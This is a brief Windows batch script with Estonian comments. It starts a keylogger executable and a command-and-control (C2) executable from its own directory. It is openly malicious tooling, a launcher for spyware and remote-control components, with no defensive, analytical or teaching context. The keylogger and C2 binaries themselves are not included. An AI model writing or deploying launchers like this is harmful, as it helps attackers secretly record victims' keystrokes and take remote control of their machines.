@echo off
setlocal

set "keylogger_path=%~dp0keylogger.exe"
set "c2_path=%~dp0c2.exe"

REM käivitab keylogger
start "" "%keylogger_path%"

REM käivitab C2 - command and control skripti
start "" "%c2_path%"

endlocal
exit
